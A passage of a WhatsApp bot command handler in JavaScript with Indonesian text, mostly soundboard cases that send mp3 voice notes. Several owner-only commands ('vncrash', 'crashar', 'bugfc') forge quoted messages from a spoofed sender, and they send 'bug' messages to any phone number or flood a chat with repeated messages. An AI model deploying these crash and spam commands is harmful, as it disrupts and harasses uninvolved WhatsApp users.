case 'bugrik': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 mem = fs.readFileSync('./Musik/sound/tes.mp3')
 sock.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:kel})
 }
 break
case 'bughaha': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 mom = fs.readFileSync('./Musik/sound/ketawa.mp3')
 sock.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugahh': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 mom = fs.readFileSync('./Musik/sound/ahh.mp3')
 sock.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugohh': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 mom = fs.readFileSync('./Musik/sound/ohh.mp3')
 sock.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugngakak': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 mim = fs.readFileSync('./Musik/sound/ketawa.mp3')
 sock.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugwkwk': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 mum = fs.readFileSync('./Musik/sound/wkwk.mp3')
 sock.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugmusik': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 mom = fs.readFileSync('./Musik/sound/musik.mp3')
 sock.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugbang': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 ah = fs.readFileSync('./Musik/sound/bang.mp3')
 sock.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugnob': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 eh = fs.readFileSync('./Musik/sound/nob.mp3')
 sock.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugbot': {
if (isBan) throw sticBanLu(from)
if (!isCreator) throw sticOwner(from)
 ih = fs.readFileSync('./Musik/sound/ikehcok.mp3')
 sock.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugsuhu': {
if (isBan) throw sticBanLu(from)
if (!isCreator) throw sticOwner(from)

 nyong = fs.readFileSync('./Musik/sound/mastah.mp3')
 sock.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugca': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 ri = fs.readFileSync('./Musik/sound/ikehcok.mp3')
 sock.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugwibu': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 ru = fs.readFileSync('./Musik/sound/loli.mp3')
 sock.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugkesel': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 re = fs.readFileSync('./Musik/sound/kesel.mp3')
 sock.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugngeselin': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 ro = fs.readFileSync('./Musik/sound/ngeselin.mp3')
 sock.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugsakit': {
if (!isCreator) return reply(api.owner) 
if (isBan) return reply(api.ban)
 mom = fs.readFileSync('./Musik/sound/sakit.mp3')
 sock.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
//=================================================//
case 'bugfc':
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!isCreator) return reply(api.owner)
if (!m.isGroup) return reply(api.group)
ydd = `☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`
sock.sendMessage(from, {text:ydd},{quoted: { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `Kok Fc Bang`, 
"jpegThumbnail": ppnyauser
}
}
}})
addCmd(command.slice(0), 1, commund)
break
case 'vncrash':
if (!isCreator) throw sticOwner(mess.owner)
if (!text) throw `MANA NOMERNYA BANG`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `RIK OHHz`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('Musik/sound/chan.mp3')
 sock.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break
case 'rik': case 'riki': case 'iki': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/tes.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'ada apa': case 'apaa': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/adapa.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'anjay': case 'anjrr': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/anjay.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'anjing': case 'ajg': case 'anjg': case 'anj': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/anjing.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'apa': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/apa.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'assalamualaikum': case 'asalamualaikum': case 'p': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/assalamualaikum.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'bohong': case 'boong': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/bohong.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'bokep': case 'porno': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/bokep.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'bot': case 'tes': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/bot.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'caper': case 'carmuk': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/caper.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'desah': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/desah.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'diem': case 'diam': case 'berisik': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/diem.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'gajelas': case 'gjls': case 'gaje': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/gajelas.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'insaf': case 'insap': case 'astagfirullah': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/insaf.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'jagoan': case 'wih jagoan': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/jagoan.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'kenapa': case 'kenapa bang': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/kenapa.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'kuntilanak': case 'kunti': case 'hantu': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/kuntilanak.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'lonte': case 'ngelonte': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/lonte.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'lu siapa': case 'siapa ya': case 'siapa': case 'siapa?': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/lusiapa.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'menangis': case 'nangis': case 'mewek': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/menangis.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'ngeri': case 'ngeri bang': case 'ngeri om': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/ngeri.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'otaknya mana': case 'otaknya dimana': case 'otaknya dmn': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/otaknya.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'kaga peduli': case 'ga peduli': case 'gapeduli': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/peduli.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'save doang': case 'cuman save': case 'save': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/savedoang.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'seleb': case 'selep': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/seleb.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'sini dek': case 'sini': case 'sinidek': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/sinidek.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'sok asik': case 'sokap': case 'soken': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/sokasik.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'sok keras': case 'soker': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/sokkeras.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'tapi boong': case 'tapi bohong': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/tapibohong.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'tetew': case 'teteww': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/tetew.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'tidak takut': case 'ga takut': case 'kaga takut': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/tidaktakut.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
 case 'sakit': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/sakit.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'ahh': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/ahh.mp3')
 sock.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'ngakak': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hiy = fs.readFileSync('./Musik/sound/ketawa.mp3')
 sock.sendMessage(m.chat, {audio: hiy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'ketawa': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hoy = fs.readFileSync('./Musik/sound/ketawa.mp3')
 sock.sendMessage(m.chat, {audio: hoy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'wkwk': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/wkwk.mp3')
 sock.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
 case 'cakep': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/chan.mp3')
 sock.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
 case 'gatau': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/jokowi.mp3')
 sock.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'kocok': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/kocok.mp3')
 sock.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
break
case 'minggir': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/minggir.mp3')
 sock.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
break
case 'asik': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/asik.mp3')
 sock.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
break
case 'bang': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 mi = fs.readFileSync('./Musik/sound/bang.mp3')
 sock.sendMessage(m.chat, {audio: mi, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'nob': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 miki = fs.readFileSync('./Musik/sound/nob.mp3')
 sock.sendMessage(m.chat, {audio: miki, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'musik': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 mo = fs.readFileSync('./Musik/sound/musik.mp3')
 sock.sendMessage(m.chat, {audio: mo, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'mastah': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 mu = fs.readFileSync('./Musik/sound/mastah.mp3')
 sock.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'slebew': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 me = fs.readFileSync('./Musik/sound/ikehcok.mp3')
 sock.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'cantik': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 muku = fs.readFileSync('./Musik/sound/loli.mp3')
 sock.sendMessage(m.chat, {audio: muku, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'kesel': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 meke = fs.readFileSync('./Musik/sound/kesel.mp3')
 sock.sendMessage(m.chat, {audio: meke, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'ngeselin': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 moko = fs.readFileSync('./Musik/sound/ngeselin.mp3')
 sock.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
inicdd = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
sock.sendMessage(m.chat, {audio: inicdd, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case 'crashar':               
          if (!isCreator) throw sticOwner(mess.owner)
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            await sock.sendMessage(m.chat, {text:"☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"},{quoted:asukonyol11})
            break
case 'owner': {
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
sock.sendContact(m.chat, owner, m)
}
addCmd(command.slice(0), 1, commund)
break
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dstone': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':
case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves':
case 'stoneeffect': {
